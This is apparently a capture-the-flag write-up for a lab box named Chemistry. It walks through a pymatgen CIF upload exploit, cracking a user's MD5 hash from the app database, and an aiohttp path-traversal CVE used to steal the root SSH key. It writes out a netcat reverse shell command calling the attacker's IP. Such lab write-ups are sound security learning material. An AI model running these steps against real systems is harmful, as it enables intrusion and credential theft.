Hi everyone and welcome in my new write-up on the Chemistry box.

So let's start by making a quick scan:

<img width="846" alt="Screenshot 2024-10-29 at 18 40 23" src="https://github.com/user-attachments/assets/b7978e21-c9cd-4db0-9825-0c267e198795">

We can see that we have two open ports: 22 and 5000.
Let's get more info:

<img width="840" alt="Screenshot 2024-10-29 at 18 44 52" src="https://github.com/user-attachments/assets/829bd780-010f-4e3a-9e68-636a5f7d969b">

Ok so it seems there is a website running on the port 5000.
Let's investigate it like inspectors hehe.

<img width="1283" alt="Screenshot 2024-10-29 at 18 46 40" src="https://github.com/user-attachments/assets/866724fe-f5b4-4794-8841-ba3b45ba4ba8">

This is just a basic application that analyzes a CIF file that we can upload.
First we need to register to see this functionality.

<img width="1101" alt="Screenshot 2024-10-29 at 18 49 09" src="https://github.com/user-attachments/assets/75dd9564-e574-472c-b8bd-2ac42f9cec17">

So they give us a file example to show us what a cif file looks like and I have to admit it's a little strange. Never seen that kind of file before. But we take it, we learn a new type of file yeahhh.

After searching around (dir fuzzing and trying to bypass the upload functionality to upload a php file), I wanted to see if there was a known vulnerability about cif files. And yes I was right there is a github repo just for that.
Link: https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

Let's take a look at the PoC that seems to be our ticket to get a foothold on the server:

<img width="1007" alt="Screenshot 2024-10-29 at 18 57 58" src="https://github.com/user-attachments/assets/b399c195-b00a-404f-a2c3-d2d1b9e6d0a7">

So if we replace the "touch pwned" by any command it should work too.

Let's try to make a reverse shell. I replace the command by "busybox nc 10.10.14.129 4444 -e sh" as it seems to be the only shell that works on the system after trying the usual ones.

This is what the exploit looks like:

<img width="1100" alt="Screenshot 2024-10-29 at 19 05 27" src="https://github.com/user-attachments/assets/f64d08c5-12c8-4668-b61c-559f454dec36">
Let's upload it and see if that worked.

<img width="612" alt="Screenshot 2024-10-29 at 19 08 03" src="https://github.com/user-attachments/assets/254c7de3-a971-4512-8cd7-3bddf1fa3d01">

Yeah we successully got our rev shell.
We have a very poor shell, I upgraded it with the usual tty commands :
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z;stty raw -echo;
export TERM=xterm

Ok so now that we have a nice shell we can hack ! Uhhhhh work I mean ;)

After checking the home directory it seems that we need to find a way to get to user rosa first.
So we need to find her creds somwhere in the server. My experience tells me to always check the DB first!

Found something interesting in the instance directory :

<img width="1071" alt="Screenshot 2024-10-29 at 19 21 45" src="https://github.com/user-attachments/assets/e5b15e16-8b3f-4d6a-95cb-ff6ce1bfa66d">

Ok so we literally have the db that stores each user that creates an account :

<img width="1089" alt="Screenshot 2024-10-29 at 19 23 00" src="https://github.com/user-attachments/assets/57eec8b0-8bf4-430f-863c-7bde581bd5d2">

At first it looks like a big mess but if look closer we can disntiguish each user associated with it's password hashed.
Let's search for rosa :

<img width="1078" alt="Screenshot 2024-10-29 at 19 27 20" src="https://github.com/user-attachments/assets/418b9417-c3e1-4d9a-a31d-caf13ad83820">

I copied the interesting part of the file locally and greped for rosa and I got her hash.
It's MD5, I usesd crackstation to crack it:

<img width="1223" alt="Screenshot 2024-10-29 at 19 30 44" src="https://github.com/user-attachments/assets/adc37889-f870-4274-a4b4-dcf7e51a9ab8">

Ok now we have everything to log into rosa.
I prefer to do it in ssh it's prettier uwu.

<img width="645" alt="Screenshot 2024-10-29 at 19 34 20" src="https://github.com/user-attachments/assets/b568b5a2-8b45-49ea-a36c-cc1367ffe9b5">

We can grab our usr.txt flag now !


Let's become root now !
I ran linpeas and nothing interesting appeared. so I took a look on the active ports running locally:

<img width="1038" alt="Screenshot 2024-10-29 at 19 49 52" src="https://github.com/user-attachments/assets/4a2c41cd-caec-4741-afe2-5b3fb81a1847">


Ok we have something ! Something is running on the port 8080. Let's make a port forwarding with the command:

ssh -L 8080:localhost:8080 rosa@10.10.11.38

Now let's see on our browser what it looks like :

<img width="1177" alt="Screenshot 2024-10-29 at 19 53 16" src="https://github.com/user-attachments/assets/2799a980-c07c-4564-9c97-cefacd8ef1a0">

So we somehow need to become root using this service. I looked around for a while and checked the app but nothing intersting seems to be in at first sight. So i decided to enumerate it to maybe find something :

<img width="1052" alt="Screenshot 2024-10-29 at 19 55 54" src="https://github.com/user-attachments/assets/dd0e7558-f2a9-4d1e-8c8f-c00a2824cc43">

Ok we have the assets directory but we don't have access to it (error 403). We are getting closer.

I also ran whatweb to check the backend techno :

<img width="1083" alt="Screenshot 2024-10-29 at 20 00 44" src="https://github.com/user-attachments/assets/f40deebe-481f-4621-9678-34458c267d7a">

We have aiohttp/3.9.1. Let' see if there is an exploit on this version.

And yes ! There seem to be a public CVE: https://github.com/z3rObyte/CVE-2024-23334-PoC

Let's try it ! We need to modify few things before :
  - change the url
  - change the payload
It looks like this :

<img width="986" alt="Screenshot 2024-10-29 at 20 08 33" src="https://github.com/user-attachments/assets/86b440ec-5f02-46dc-91c6-32ad04e45efa">

We can leave the file we want to read as it is just to see first if that works.
Let's run it:

<img width="709" alt="Screenshot 2024-10-29 at 20 12 26" src="https://github.com/user-attachments/assets/8fc312be-0fdd-4dc6-b652-554c789dc6f9">

It works, we retrieved the /etc/passwd file.
So now we can just read /root/root.txt but we are hacker and we want to become root 😈.

So let's grab the root private key :

<img width="852" alt="Screenshot 2024-10-29 at 20 18 26" src="https://github.com/user-attachments/assets/bfac3ad2-3493-48d6-b46e-af00fdb8f99a">

Yeah we got it. I will just copy it locally and chmod 600 the file.
We can log as root now :

<img width="529" alt="Screenshot 2024-10-29 at 20 21 32" src="https://github.com/user-attachments/assets/3eef1026-482f-41c7-9b30-d313b057c251">

Here we are root. Grab your cupcake 🧁 and a tea we serve it.
That was a fun box, I really liked it and learned new stuff.
See ya on the next write up !
